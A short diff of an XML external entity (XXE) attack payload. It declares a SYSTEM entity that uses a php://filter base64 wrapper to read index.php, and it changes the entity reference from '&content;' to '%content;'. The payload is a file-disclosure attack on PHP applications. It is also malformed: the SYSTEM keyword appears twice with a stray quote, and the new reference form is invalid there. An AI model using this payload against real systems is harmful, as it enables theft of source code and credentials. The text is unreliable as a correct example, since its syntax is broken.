@@ -2,5 +2,5 @@
 <!DOCTYPE a [
     <!ENTITY content SYSTEM "SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
 <foo>
-        <value>&content;</value> 
+        <value>%content;</value> 
 </foo>
